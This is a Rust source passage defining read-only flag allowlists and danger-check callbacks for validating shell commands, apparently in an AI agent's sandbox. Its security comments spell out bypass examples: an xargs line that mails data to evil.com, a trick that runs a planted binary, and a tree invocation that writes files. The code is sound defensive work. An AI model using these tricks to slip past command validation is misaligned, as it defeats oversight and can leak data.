//! Read-only command allowlist tables for bash command validation — the tables
//! that record which command flags keep a command read-only.
//!
//! These tables encode FACTS: which command flags are read-only. They are
//! security-critical and must be exact — every key, every flag-type value, every
//! comment that documents security rationale is load-bearing.

use std::collections::{HashMap, HashSet};
use std::sync::LazyLock;

use regex::Regex;

use super::external::{
    DOCKER_READ_ONLY_COMMANDS, PYRIGHT_READ_ONLY_COMMANDS, RIPGREP_READ_ONLY_COMMANDS,
};
use super::gh::GH_READ_ONLY_COMMANDS;
use super::git::GIT_READ_ONLY_COMMANDS;
use super::sed::sed_command_is_allowed_by_allowlist;
use super::types::FlagArgType as F;
use super::types::{CommandConfig, ExternalCommandConfig, FlagArgType};

/// Build a safe-flags map from static `(flag, arg-type)` pairs.
fn flags(pairs: &[(&'static str, FlagArgType)]) -> HashMap<&'static str, FlagArgType> {
    pairs.iter().map(|(k, v)| (*k, *v)).collect()
}

/// Config with only safe flags (no regex, no danger callback, default `--` handling).
fn simple(safe_flags: HashMap<&'static str, FlagArgType>) -> CommandConfig {
    CommandConfig {
        safe_flags,
        regex: None,
        additional_command_is_dangerous_callback: None,
        respects_double_dash: None,
    }
}

/// Splice an external read-only table (git/gh/docker/rg/pyright) into an allowlist,
/// preserving entry order (consumers scan for the FIRST matching command prefix).
fn extend_with_external(
    list: &mut Vec<(&'static str, CommandConfig)>,
    table: &[(&'static str, ExternalCommandConfig)],
) {
    for (name, config) in table {
        list.push((
            *name,
            CommandConfig {
                safe_flags: config.safe_flags.clone(),
                regex: None,
                additional_command_is_dangerous_callback: config
                    .additional_command_is_dangerous_callback,
                respects_double_dash: config.respects_double_dash,
            },
        ));
    }
}

// Shared safe flags for fd and fdfind (Debian/Ubuntu package name)
// SECURITY: -x/--exec and -X/--exec-batch are deliberately excluded —
// they execute arbitrary commands for each search result.
static FD_SAFE_FLAGS: LazyLock<HashMap<&'static str, FlagArgType>> = LazyLock::new(|| {
    flags(&[
        ("-h", F::None),
        ("--help", F::None),
        ("-V", F::None),
        ("--version", F::None),
        ("-H", F::None),
        ("--hidden", F::None),
        ("-I", F::None),
        ("--no-ignore", F::None),
        ("--no-ignore-vcs", F::None),
        ("--no-ignore-parent", F::None),
        ("-s", F::None),
        ("--case-sensitive", F::None),
        ("-i", F::None),
        ("--ignore-case", F::None),
        ("-g", F::None),
        ("--glob", F::None),
        ("--regex", F::None),
        ("-F", F::None),
        ("--fixed-strings", F::None),
        ("-a", F::None),
        ("--absolute-path", F::None),
        // SECURITY: -l/--list-details EXCLUDED — internally executes `ls` as subprocess (same
        // pathway as --exec-batch). PATH hijacking risk if malicious `ls` is on PATH.
        ("-L", F::None),
        ("--follow", F::None),
        ("-p", F::None),
        ("--full-path", F::None),
        ("-0", F::None),
        ("--print0", F::None),
        ("-d", F::Number),
        ("--max-depth", F::Number),
        ("--min-depth", F::Number),
        ("--exact-depth", F::Number),
        ("-t", F::String),
        ("--type", F::String),
        ("-e", F::String),
        ("--extension", F::String),
        ("-S", F::String),
        ("--size", F::String),
        ("--changed-within", F::String),
        ("--changed-before", F::String),
        ("-o", F::String),
        ("--owner", F::String),
        ("-E", F::String),
        ("--exclude", F::String),
        ("--ignore-file", F::String),
        ("-c", F::String),
        ("--color", F::String),
        ("-j", F::Number),
        ("--threads", F::Number),
        ("--max-buffer-time", F::String),
        ("--max-results", F::Number),
        ("-1", F::None),
        ("-q", F::None),
        ("--quiet", F::None),
        ("--show-errors", F::None),
        ("--strip-cwd-prefix", F::None),
        ("--one-file-system", F::None),
        ("--prune", F::None),
        ("--search-path", F::String),
        ("--base-directory", F::String),
        ("--path-separator", F::String),
        ("--batch-size", F::Number),
        ("--no-require-git", F::None),
        ("--hyperlink", F::String),
        ("--and", F::String),
        ("--format", F::String),
    ])
});

// Checksum commands - these only read files and compute/verify hashes
// All flags are safe as they only affect output format or verification behavior
// (sha256sum / sha1sum / md5sum share one identical flag set).
fn checksum_safe_flags() -> HashMap<&'static str, FlagArgType> {
    flags(&[
        // Mode flags
        ("-b", F::None), // Binary mode
        ("--binary", F::None),
        ("-t", F::None), // Text mode
        ("--text", F::None),
        // Check/verify flags
        ("-c", F::None), // Verify checksums from file
        ("--check", F::None),
        ("--ignore-missing", F::None), // Ignore missing files during check
        ("--quiet", F::None),          // Quiet mode during check
        ("--status", F::None),         // Don't output, exit code shows success
        ("--strict", F::None),         // Exit non-zero for improperly formatted lines
        ("-w", F::None),               // Warn about improperly formatted lines
        ("--warn", F::None),
        // Output format flags
        ("--tag", F::None), // BSD-style output
        ("-z", F::None),    // End output lines with NUL
        ("--zero", F::None),
        // Help and version
        ("--help", F::None),
        ("--version", F::None),
    ])
}

/// sed extra guard: dangerous unless the raw command passes the sed read-only allowlist.
fn sed_additional_is_dangerous(raw_command: &str, _args: &[String]) -> bool {
    !sed_command_is_allowed_by_allowlist(raw_command, None)
}

/// BSD-style option token containing the `e` modifier: letters only, no leading dash.
static RE_BSD_LETTERS_WITH_E: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^[a-zA-Z]*e[a-zA-Z]*$").unwrap());

// Block BSD-style 'e' modifier which shows environment variables
// BSD options are letter-only tokens without a leading dash
fn ps_additional_is_dangerous(_raw_command: &str, args: &[String]) -> bool {
    // Check for BSD-style 'e' in letter-only tokens (not -e which is UNIX-style)
    // A BSD-style option is a token of only letters (no leading dash) containing 'e'
    args.iter()
        .any(|a| !a.starts_with('-') && RE_BSD_LETTERS_WITH_E.is_match(a))
}

// date: verify positional args start with + (format strings like +"%Y-%m-%d").
// CRITICAL: date positional args in format MMDDhhmm[[CC]YY][.ss] set system time.
fn date_additional_is_dangerous(_raw_command: &str, args: &[String]) -> bool {
    // args are already parsed tokens after "date"
    // Flags that require an argument
    let flags_with_args: HashSet<&str> = HashSet::from([
        "-d",
        "--date",
        "-r",
        "--reference",
        "--iso-8601",
        "--rfc-3339",
    ]);
    let mut i = 0;
    while i < args.len() {
        let token = &args[i];
        // Skip flags and their arguments
        if token.starts_with("--") && token.contains('=') {
            // Long flag with =value, already consumed
            i += 1;
        } else if token.starts_with('-') {
            // Flag - check if it takes an argument
            if flags_with_args.contains(token.as_str()) {
                i += 2; // Skip flag and its argument
            } else {
                i += 1; // Just skip the flag
            }
        } else {
            // Positional argument - must start with + for format strings
            // Anything else (like MMDDhhmm) could set system time
            if !token.starts_with('+') {
                return true; // Dangerous
            }
            i += 1;
        }
    }
    false // Safe
}

// Block +m (create mount supplement file) — writes to disk.
// +prefix flags are treated as positional args by validate_flags,
// so we must catch them here. lsof accepts +m<path> (attached path, no space)
// with both absolute (+m/tmp/evil) and relative (+mfoo, +m.evil) paths.
fn lsof_additional_is_dangerous(_raw_command: &str, args: &[String]) -> bool {
    args.iter().any(|a| a == "+m" || a.starts_with("+m"))
}

fn tput_additional_is_dangerous(_raw_command: &str, args: &[String]) -> bool {
    // Capabilities that modify terminal state or could be harmful.
    // init/reset run iprog (arbitrary code from terminfo) and modify tty settings.
    // rs1/rs2/rs3/is1/is2/is3 are the individual reset/init sequences that
    // init/reset invoke internally — rs1 sends ESC c (full terminal reset).
    // clear erases scrollback (evidence destruction). mc5/mc5p activate media copy
    // (redirect output to printer device). smcup/rmcup manipulate screen buffer.
    // pfkey/pfloc/pfx/pfxl program function keys — pfloc executes strings locally.
    // rf is reset file (analogous to if/init_file).
    let dangerous_capabilities: HashSet<&str> = HashSet::from([
        "init", "reset", "rs1", "rs2", "rs3", "is1", "is2", "is3", "iprog", "if", "rf", "clear",
        "flash", "mc0", "mc4", "mc5", "mc5i", "mc5p", "pfkey", "pfloc", "pfx", "pfxl", "smcup",
        "rmcup",
    ]);
    let flags_with_args: HashSet<&str> = HashSet::from(["-T"]);
    let mut i = 0;
    let mut after_double_dash = false;
    while i < args.len() {
        let token = &args[i];
        if token == "--" {
            after_double_dash = true;
            i += 1;
        } else if !after_double_dash && token.starts_with('-') {
            // Defense-in-depth: block -S even if it somehow passes validate_flags
            if token == "-S" {
                return true;
            }
            // Also check for -S bundled with other flags (e.g., -xS)
            if !token.starts_with("--") && token.chars().count() > 2 && token.contains('S') {
                return true;
            }
            if flags_with_args.contains(token.as_str()) {
                i += 2;
            } else {
                i += 1;
            }
        } else {
            if dangerous_capabilities.contains(token.as_str()) {
                return true;
            }
            i += 1;
        }
    }
    false
}

/// Central configuration for allowlist-based command validation.
/// All commands and flags here should only allow reading files. They should not
/// allow writing to files, executing code, or creating network requests.
///
/// Entry order matters: consumers scan for the FIRST matching (possibly multi-word)
/// command prefix, so e.g. "git remote show" must precede "git remote".
pub static COMMAND_ALLOWLIST: LazyLock<Vec<(&'static str, CommandConfig)>> = LazyLock::new(|| {
    let mut list: Vec<(&'static str, CommandConfig)> = Vec::new();

    list.push((
        "xargs",
        simple(flags(&[
            ("-I", F::Braces),
            // SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
            // optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
            // attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
            // flag takes NO arg and `X` becomes the next positional (target command).
            //
            // `-i` (`i::` — optional replace-str):
            //   echo /usr/sbin/sendm | xargs -it tail a@evil.com
            //   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
            //   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
            //
            // `-e` (`e::` — optional eof-str):
            //   cat data | xargs -e EOF echo foo
            //   validator: -e consumes 'EOF' as arg (type 'EOF'), echo ∈ SAFE_TARGET
            //   GNU: -e no attached arg → no eof-str, 'EOF' is the TARGET COMMAND
            //   → executes binary named EOF from PATH → CODE EXEC (malicious repo)
            //
            // Use uppercase `-I {}` (mandatory arg) and `-E EOF` (POSIX, mandatory
            // arg) instead — both validator and xargs agree on argument consumption.
            // `-i`/`-e` are deprecated (GNU: "use -I instead" / "use -E instead").
            ("-n", F::Number),
            ("-P", F::Number),
            ("-L", F::Number),
            ("-s", F::Number),
            ("-E", F::Eof), // POSIX, MANDATORY separate arg — validator & xargs agree
            ("-0", F::None),
            ("-t", F::None),
            ("-r", F::None),
            ("-x", F::None),
            ("-d", F::Char),
        ])),
    ));

    // All git read-only commands from shared validation map
    extend_with_external(&mut list, &GIT_READ_ONLY_COMMANDS);

    list.push((
        "file",
        simple(flags(&[
            // Output format flags
            ("--brief", F::None),
            ("-b", F::None),
            ("--mime", F::None),
            ("-i", F::None),
            ("--mime-type", F::None),
            ("--mime-encoding", F::None),
            ("--apple", F::None),
            // Behavior flags
            ("--check-encoding", F::None),
            ("-c", F::None),
            ("--exclude", F::String),
            ("--exclude-quiet", F::String),
            ("--print0", F::None),
            ("-0", F::None),
            ("-f", F::String),
            ("-F", F::String),
            ("--separator", F::String),
            ("--help", F::None),
            ("--version", F::None),
            ("-v", F::None),
            // Following/dereferencing
            ("--no-dereference", F::None),
            ("-h", F::None),
            ("--dereference", F::None),
            ("-L", F::None),
            // Magic file options (safe when just reading)
            ("--magic-file", F::String),
            ("-m", F::String),
            // Other safe options
            ("--keep-going", F::None),
            ("-k", F::None),
            ("--list", F::None),
            ("-l", F::None),
            ("--no-buffer", F::None),
            ("-n", F::None),
            ("--preserve-date", F::None),
            ("-p", F::None),
            ("--raw", F::None),
            ("-r", F::None),
            ("-s", F::None),
            ("--special-files", F::None),
            // Uncompress flag for archives
            ("--uncompress", F::None),
            ("-z", F::None),
        ])),
    ));

    list.push((
        "sed",
        CommandConfig {
            safe_flags: flags(&[
                // Expression flags
                ("--expression", F::String),
                ("-e", F::String),
                // Output control
                ("--quiet", F::None),
                ("--silent", F::None),
                ("-n", F::None),
                // Extended regex
                ("--regexp-extended", F::None),
                ("-r", F::None),
                ("--posix", F::None),
                ("-E", F::None),
                // Line handling
                ("--line-length", F::Number),
                ("-l", F::Number),
                ("--zero-terminated", F::None),
                ("-z", F::None),
                ("--separate", F::None),
                ("-s", F::None),
                ("--unbuffered", F::None),
                ("-u", F::None),
                // Debugging/help
                ("--debug", F::None),
                ("--help", F::None),
                ("--version", F::None),
            ]),
            regex: None,
            additional_command_is_dangerous_callback: Some(sed_additional_is_dangerous),
            respects_double_dash: None,
        },
    ));

    list.push((
        "sort",
        simple(flags(&[
            // Sorting options
            ("--ignore-leading-blanks", F::None),
            ("-b", F::None),
            ("--dictionary-order", F::None),
            ("-d", F::None),
            ("--ignore-case", F::None),
            ("-f", F::None),
            ("--general-numeric-sort", F::None),
            ("-g", F::None),
            ("--human-numeric-sort", F::None),
            ("-h", F::None),
            ("--ignore-nonprinting", F::None),
            ("-i", F::None),
            ("--month-sort", F::None),
            ("-M", F::None),
            ("--numeric-sort", F::None),
            ("-n", F::None),
            ("--random-sort", F::None),
            ("-R", F::None),
            ("--reverse", F::None),
            ("-r", F::None),
            ("--sort", F::String),
            ("--stable", F::None),
            ("-s", F::None),
            ("--unique", F::None),
            ("-u", F::None),
            ("--version-sort", F::None),
            ("-V", F::None),
            ("--zero-terminated", F::None),
            ("-z", F::None),
            // Key specifications
            ("--key", F::String),
            ("-k", F::String),
            ("--field-separator", F::String),
            ("-t", F::String),
            // Checking
            ("--check", F::None),
            ("-c", F::None),
            ("--check-char-order", F::None),
            ("-C", F::None),
            // Merging
            ("--merge", F::None),
            ("-m", F::None),
            // Buffer size
            ("--buffer-size", F::String),
            ("-S", F::String),
            // Parallel processing
            ("--parallel", F::Number),
            // Batch size
            ("--batch-size", F::Number),
            // Help and version
            ("--help", F::None),
            ("--version", F::None),
        ])),
    ));

    list.push((
        "man",
        simple(flags(&[
            // Safe display options
            ("-a", F::None),        // Display all manual pages
            ("--all", F::None),     // Same as -a
            ("-d", F::None),        // Debug mode
            ("-f", F::None),        // Emulate whatis
            ("--whatis", F::None),  // Same as -f
            ("-h", F::None),        // Help
            ("-k", F::None),        // Emulate apropos
            ("--apropos", F::None), // Same as -k
            ("-l", F::String),      // Local file (safe for reading, Linux only)
            ("-w", F::None),        // Display location instead of content
            // Safe formatting options
            ("-S", F::String), // Restrict manual sections
            ("-s", F::String), // Same as -S for whatis/apropos mode
        ])),
    ));

    // help command - only allow bash builtin help flags to prevent attacks when
    // help is aliased to man (e.g., in oh-my-zsh common-aliases plugin).
    // man's -P flag allows arbitrary command execution via pager.
    list.push((
        "help",
        simple(flags(&[
            ("-d", F::None), // Output short description for each topic
            ("-m", F::None), // Display usage in pseudo-manpage format
            ("-s", F::None), // Output only a short usage synopsis
        ])),
    ));

    list.push((
        "netstat",
        simple(flags(&[
            // Safe display options
            ("-a", F::None), // Show all sockets
            ("-L", F::None), // Show listen queue sizes
            ("-l", F::None), // Print full IPv6 address
            ("-n", F::None), // Show network addresses as numbers
            // Safe filtering options
            ("-f", F::String), // Address family (inet, inet6, unix, vsock)
            // Safe interface options
            ("-g", F::None),   // Show multicast group membership
            ("-i", F::None),   // Show interface state
            ("-I", F::String), // Specific interface
            // Safe statistics options
            ("-s", F::None), // Show per-protocol statistics
            // Safe routing options
            ("-r", F::None), // Show routing tables
            // Safe mbuf options
            ("-m", F::None), // Show memory management statistics
            // Safe other options
            ("-v", F::None), // Increase verbosity
        ])),
    ));

    list.push((
        "ps",
        CommandConfig {
            safe_flags: flags(&[
                // UNIX-style process selection (these are safe)
                ("-e", F::None), // Select all processes
                ("-A", F::None), // Select all processes (same as -e)
                ("-a", F::None), // Select all with tty except session leaders
                ("-d", F::None), // Select all except session leaders
                ("-N", F::None), // Negate selection
                ("--deselect", F::None),
                // UNIX-style output format (safe, doesn't show env)
                ("-f", F::None), // Full format
                ("-F", F::None), // Extra full format
                ("-l", F::None), // Long format
                ("-j", F::None), // Jobs format
                ("-y", F::None), // Don't show flags
                // Output modifiers (safe ones)
                ("-w", F::None),  // Wide output
                ("-ww", F::None), // Unlimited width
                ("--width", F::Number),
                ("-c", F::None), // Show scheduler info
                ("-H", F::None), // Show process hierarchy
                ("--forest", F::None),
                ("--headers", F::None),
                ("--no-headers", F::None),
                ("-n", F::String), // Set namelist file
                ("--sort", F::String),
                // Thread display
                ("-L", F::None), // Show threads
                ("-T", F::None), // Show threads
                ("-m", F::None), // Show threads after processes
                // Process selection by criteria
                ("-C", F::String), // By command name
                ("-G", F::String), // By real group ID
                ("-g", F::String), // By session or effective group
                ("-p", F::String), // By PID
                ("--pid", F::String),
                ("-q", F::String), // Quick mode by PID
                ("--quick-pid", F::String),
                ("-s", F::String), // By session ID
                ("--sid", F::String),
                ("-t", F::String), // By tty
                ("--tty", F::String),
                ("-U", F::String), // By real user ID
                ("-u", F::String), // By effective user ID
                ("--user", F::String),
                // Help/version
                ("--help", F::None),
                ("--info", F::None),
                ("-V", F::None),
                ("--version", F::None),
            ]),
            regex: None,
            additional_command_is_dangerous_callback: Some(ps_additional_is_dangerous),
            respects_double_dash: None,
        },
    ));

    list.push((
        "base64",
        CommandConfig {
            safe_flags: flags(&[
                // Safe decode options
                ("-d", F::None),       // Decode
                ("-D", F::None),       // Decode (macOS)
                ("--decode", F::None), // Decode
                // Safe formatting options
                ("-b", F::Number),      // Break lines at num (macOS)
                ("--break", F::Number), // Break lines at num (macOS)
                ("-w", F::Number),      // Wrap lines at COLS (Linux)
                ("--wrap", F::Number),  // Wrap lines at COLS (Linux)
                // Safe input options (read from file, not write)
                ("-i", F::String),      // Input file (safe for reading)
                ("--input", F::String), // Input file (safe for reading)
                // Safe misc options
                ("--ignore-garbage", F::None), // Ignore non-alphabet chars when decoding (Linux)
                ("-h", F::None),               // Help
                ("--help", F::None),           // Help
                ("--version", F::None),        // Version
            ]),
            regex: None,
            additional_command_is_dangerous_callback: None,
            respects_double_dash: Some(false), // macOS base64 does not respect POSIX --
        },
    ));

    list.push((
        "grep",
        simple(flags(&[
            // Pattern flags
            ("-e", F::String), // Pattern
            ("--regexp", F::String),
            ("-f", F::String), // File with patterns
            ("--file", F::String),
            ("-F", F::None), // Fixed strings
            ("--fixed-strings", F::None),
            ("-G", F::None), // Basic regexp (default)
            ("--basic-regexp", F::None),
            ("-E", F::None), // Extended regexp
            ("--extended-regexp", F::None),
            ("-P", F::None), // Perl regexp
            ("--perl-regexp", F::None),
            // Matching control
            ("-i", F::None), // Ignore case
            ("--ignore-case", F::None),
            ("--no-ignore-case", F::None),
            ("-v", F::None), // Invert match
            ("--invert-match", F::None),
            ("-w", F::None), // Word regexp
            ("--word-regexp", F::None),
            ("-x", F::None), // Line regexp
            ("--line-regexp", F::None),
            // Output control
            ("-c", F::None), // Count
            ("--count", F::None),
            ("--color", F::String),
            ("--colour", F::String),
            ("-L", F::None), // Files without match
            ("--files-without-match", F::None),
            ("-l", F::None), // Files with matches
            ("--files-with-matches", F::None),
            ("-m", F::Number), // Max count
            ("--max-count", F::Number),
            ("-o", F::None), // Only matching
            ("--only-matching", F::None),
            ("-q", F::None), // Quiet
            ("--quiet", F::None),
            ("--silent", F::None),
            ("-s", F::None), // No messages
            ("--no-messages", F::None),
            // Output line prefix
            ("-b", F::None), // Byte offset
            ("--byte-offset", F::None),
            ("-H", F::None), // With filename
            ("--with-filename", F::None),
            ("-h", F::None), // No filename
            ("--no-filename", F::None),
            ("--label", F::String),
            ("-n", F::None), // Line number
            ("--line-number", F::None),
            ("-T", F::None), // Initial tab
            ("--initial-tab", F::None),
            ("-u", F::None), // Unix byte offsets
            ("--unix-byte-offsets", F::None),
            ("-Z", F::None), // Null after filename
            ("--null", F::None),
            ("-z", F::None), // Null data
            ("--null-data", F::None),
            // Context control
            ("-A", F::Number), // After context
            ("--after-context", F::Number),
            ("-B", F::Number), // Before context
            ("--before-context", F::Number),
            ("-C", F::Number), // Context
            ("--context", F::Number),
            ("--group-separator", F::String),
            ("--no-group-separator", F::None),
            // File and directory selection
            ("-a", F::None), // Text (process binary as text)
            ("--text", F::None),
            ("--binary-files", F::String),
            ("-D", F::String), // Devices
            ("--devices", F::String),
            ("-d", F::String), // Directories
            ("--directories", F::String),
            ("--exclude", F::String),
            ("--exclude-from", F::String),
            ("--exclude-dir", F::String),
            ("--include", F::String),
            ("-r", F::None), // Recursive
            ("--recursive", F::None),
            ("-R", F::None), // Dereference-recursive
            ("--dereference-recursive", F::None),
            // Other options
            ("--line-buffered", F::None),
            ("-U", F::None), // Binary
            ("--binary", F::None),
            // Help and version
            ("--help", F::None),
            ("-V", F::None),
            ("--version", F::None),
        ])),
    ));

    extend_with_external(&mut list, &RIPGREP_READ_ONLY_COMMANDS);

    list.push(("sha256sum", simple(checksum_safe_flags())));
    list.push(("sha1sum", simple(checksum_safe_flags())));
    list.push(("md5sum", simple(checksum_safe_flags())));

    // tree command - moved from READONLY_COMMAND_REGEXES to allow flags and path arguments
    // -o/--output writes to a file, so it's excluded. All other flags are display/filter options.
    list.push((
        "tree",
        simple(flags(&[
            // Listing options
            ("-a", F::None),   // All files
            ("-d", F::None),   // Directories only
            ("-l", F::None),   // Follow symlinks
            ("-f", F::None),   // Full path prefix
            ("-x", F::None),   // Stay on current filesystem
            ("-L", F::Number), // Max depth
            // SECURITY: -R REMOVED. tree -R combined with -H (HTML mode) and -L (depth)
            // WRITES 00Tree.html files to every subdirectory at the depth boundary.
            // From man tree (< 2.1.0): "-R — at each of them execute tree again
            // adding `-o 00Tree.html` as a new option." The comment "Rerun at max
            // depth" was misleading — the "rerun" includes a hardcoded -o file write.
            // `tree -R -H . -L 2 /path` → writes /path/<subdir>/00Tree.html for each
            // subdir at depth 2. FILE WRITE, zero permissions.
            ("-P", F::String), // Include pattern
            ("-I", F::String), // Exclude pattern
            ("--gitignore", F::None),
            ("--gitfile", F::String),
            ("--ignore-case", F::None),
            ("--matchdirs", F::None),
            ("--metafirst", F::None),
            ("--prune", F::None),
            ("--info", F::None),
            ("--infofile", F::String),
            ("--noreport", F::None),
            ("--charset", F::String),
            ("--filelimit", F::Number),
            // File display options
            ("-q", F::None), // Non-printable as ?
            ("-N", F::None), // Non-printable as-is
            ("-Q", F::None), // Quote filenames
            ("-p", F::None), // Protections
            ("-u", F::None), // Owner
            ("-g", F::None), // Group
            ("-s", F::None), // Size bytes
            ("-h", F::None), // Human-readable sizes
            ("--si", F::None),
            ("--du", F::None),
            ("-D", F::None), // Last modification time
            ("--timefmt", F::String),
            ("-F", F::None), // Append indicator
            ("--inodes", F::None),
            ("--device", F::None),
            // Sorting options
            ("-v", F::None), // Version sort
            ("-t", F::None), // Sort by mtime
            ("-c", F::None), // Sort by ctime
            ("-U", F::None), // Unsorted
            ("-r", F::None), // Reverse sort
            ("--dirsfirst", F::None),
            ("--filesfirst", F::None),
            ("--sort", F::String),
            // Graphics/output options
            ("-i", F::None),   // No indentation lines
            ("-A", F::None),   // ANSI line graphics
            ("-S", F::None),   // CP437 line graphics
            ("-n", F::None),   // No color
            ("-C", F::None),   // Color
            ("-X", F::None),   // XML output
            ("-J", F::None),   // JSON output
            ("-H", F::String), // HTML output with base HREF
            ("--nolinks", F::None),
            ("--hintro", F::String),
            ("--houtro", F::String),
            ("-T", F::String), // HTML title
            ("--hyperlink", F::None),
            ("--scheme", F::String),
            ("--authority", F::String),
            // Input options (read from file, not write)
            ("--fromfile", F::None),
            ("--fromtabfile", F::None),
            ("--fflinks", F::None),
            // Help and version
            ("--help", F::None),
            ("--version", F::None),
        ])),
    ));

    // date command - moved from READONLY_COMMANDS because -s/--set can set system time
    // Also -f/--file can be used to read dates from file and set time
    // We only allow safe display options
    list.push((
        "date",
        CommandConfig {
            safe_flags: flags(&[
                // Display options (safe - don't modify system time)
                ("-d", F::String), // --date=STRING - display time described by STRING
                ("--date", F::String),
                ("-r", F::String), // --reference=FILE - display file's modification time
                ("--reference", F::String),
                ("-u", F::None), // --utc - use UTC
                ("--utc", F::None),
                ("--universal", F::None),
                // Output format options
                ("-I", F::None), // --iso-8601 (can have optional argument, but none type handles bare flag)
                ("--iso-8601", F::String),
                ("-R", F::None), // --rfc-email
                ("--rfc-email", F::None),
                ("--rfc-3339", F::String),
                // Debug/help
                ("--debug", F::None),
                ("--help", F::None),
                ("--version", F::None),
            ]),
            regex: None,
            // Dangerous flags NOT included (blocked by omission):
            // -s / --set - sets system time
            // -f / --file - reads dates from file (can be used to set time in batch)
            // CRITICAL: date positional args in format MMDDhhmm[[CC]YY][.ss] set system time
            // Use callback to verify positional args start with + (format strings like +"%Y-%m-%d")
            additional_command_is_dangerous_callback: Some(date_additional_is_dangerous),
            respects_double_dash: None,
        },
    ));

    // hostname command - moved from READONLY_COMMANDS because positional args set hostname
    // Also -F/--file sets hostname from file, -b/--boot sets default hostname
    // We only allow safe display options and BLOCK any positional arguments
    list.push((
        "hostname",
        CommandConfig {
            safe_flags: flags(&[
                // Display options only (safe)
                ("-f", F::None), // --fqdn - display FQDN
                ("--fqdn", F::None),
                ("--long", F::None),
                ("-s", F::None), // --short - display short name
                ("--short", F::None),
                ("-i", F::None), // --ip-address
                ("--ip-address", F::None),
                ("-I", F::None), // --all-ip-addresses
                ("--all-ip-addresses", F::None),
                ("-a", F::None), // --alias
                ("--alias", F::None),
                ("-d", F::None), // --domain
                ("--domain", F::None),
                ("-A", F::None), // --all-fqdns
                ("--all-fqdns", F::None),
                ("-v", F::None), // --verbose
                ("--verbose", F::None),
                ("-h", F::None), // --help
                ("--help", F::None),
                ("-V", F::None), // --version
                ("--version", F::None),
            ]),
            // CRITICAL: Block any positional arguments - they set the hostname
            // Also block -F/--file, -b/--boot, -y/--yp/--nis (not in safe_flags = blocked)
            // Use regex to ensure no positional args after flags
            regex: Some(
                fancy_regex::Regex::new(r"^hostname(?:\s+(?:-[a-zA-Z]|--[a-zA-Z-]+))*\s*$")
                    .unwrap(),
            ),
            additional_command_is_dangerous_callback: None,
            respects_double_dash: None,
        },
    ));

    // info command - moved from READONLY_COMMANDS because -o/--output writes to files
    // Also --dribble writes keystrokes to file, --init-file loads custom config
    // We only allow safe display/navigation options
    //
    // Dangerous flags NOT included (blocked by omission):
    // -o / --output - writes output to file
    // --dribble - records keystrokes to file
    // --init-file - loads custom config (potential code execution)
    // --restore - replays keystrokes from file
    list.push((
        "info",
        simple(flags(&[
            // Navigation/display options (safe)
            ("-f", F::String), // --file - specify manual file to read
            ("--file", F::String),
            ("-d", F::String), // --directory - search path
            ("--directory", F::String),
            ("-n", F::String), // --node - specify node
            ("--node", F::String),
            ("-a", F::None), // --all
            ("--all", F::None),
            ("-k", F::String), // --apropos - search
            ("--apropos", F::String),
            ("-w", F::None), // --where - show location
            ("--where", F::None),
            ("--location", F::None),
            ("--show-options", F::None),
            ("--vi-keys", F::None),
            ("--subnodes", F::None),
            ("-h", F::None),
            ("--help", F::None),
            ("--usage", F::None),
            ("--version", F::None),
        ])),
    ));

    list.push((
        "lsof",
        CommandConfig {
            safe_flags: flags(&[
                ("-?", F::None),
                ("-h", F::None),
                ("-v", F::None),
                ("-a", F::None),
                ("-b", F::None),
                ("-C", F::None),
                ("-l", F::None),
                ("-n", F::None),
                ("-N", F::None),
                ("-O", F::None),
                ("-P", F::None),
                ("-Q", F::None),
                ("-R", F::None),
                ("-t", F::None),
                ("-U", F::None),
                ("-V", F::None),
                ("-X", F::None),
                ("-H", F::None),
                ("-E", F::None),
                ("-F", F::None),
                ("-g", F::None),
                ("-i", F::None),
                ("-K", F::None),
                ("-L", F::None),
                ("-o", F::None),
                ("-r", F::None),
                ("-s", F::None),
                ("-S", F::None),
                ("-T", F::None),
                ("-x", F::None),
                ("-A", F::String),
                ("-c", F::String),
                ("-d", F::String),
                ("-e", F::String),
                ("-k", F::String),
                ("-p", F::String),
                ("-u", F::String),
                // OMITTED (writes to disk): -D (device cache file build/update)
            ]),
            regex: None,
            additional_command_is_dangerous_callback: Some(lsof_additional_is_dangerous),
            respects_double_dash: None,
        },
    ));

    list.push((
        "pgrep",
        simple(flags(&[
            ("-d", F::String),
            ("--delimiter", F::String),
            ("-l", F::None),
            ("--list-name", F::None),
            ("-a", F::None),
            ("--list-full", F::None),
            ("-v", F::None),
            ("--inverse", F::None),
            ("-w", F::None),
            ("--lightweight", F::None),
            ("-c", F::None),
            ("--count", F::None),
            ("-f", F::None),
            ("--full", F::None),
            ("-g", F::String),
            ("--pgroup", F::String),
            ("-G", F::String),
            ("--group", F::String),
            ("-i", F::None),
            ("--ignore-case", F::None),
            ("-n", F::None),
            ("--newest", F::None),
            ("-o", F::None),
            ("--oldest", F::None),
            ("-O", F::String),
            ("--older", F::String),
            ("-P", F::String),
            ("--parent", F::String),
            ("-s", F::String),
            ("--session", F::String),
            ("-t", F::String),
            ("--terminal", F::String),
            ("-u", F::String),
            ("--euid", F::String),
            ("-U", F::String),
            ("--uid", F::String),
            ("-x", F::None),
            ("--exact", F::None),
            ("-F", F::String),
            ("--pidfile", F::String),
            ("-L", F::None),
            ("--logpidfile", F::None),
            ("-r", F::String),
            ("--runstates", F::String),
            ("--ns", F::String),
            ("--nslist", F::String),
            ("--help", F::None),
            ("-V", F::None),
            ("--version", F::None),
        ])),
    ));

    list.push((
        "tput",
        CommandConfig {
            safe_flags: flags(&[
                ("-T", F::String),
                ("-V", F::None),
                ("-x", F::None),
                // SECURITY: -S (read capability names from stdin) deliberately EXCLUDED.
                // It must NOT be in safe_flags because validate_flags unbundles combined
                // short flags (e.g., -xS → -x + -S), but the callback receives the raw
                // token '-xS' and only checks exact match 'token == "-S"'. Excluding -S
                // from safe_flags ensures validate_flags rejects it (bundled or not) before
                // the callback runs. The callback's -S check is defense-in-depth.
            ]),
            regex: None,
            additional_command_is_dangerous_callback: Some(tput_additional_is_dangerous),
            respects_double_dash: None,
        },
    ));

    // ss — socket statistics (iproute2). Read-only query tool equivalent to netstat.
    // SECURITY: -K/--kill (forcibly close sockets) and -D/--diag (dump raw data to file)
    // are deliberately excluded. -F/--filter (read filter from file) also excluded.
    list.push((
        "ss",
        simple(flags(&[
            ("-h", F::None),
            ("--help", F::None),
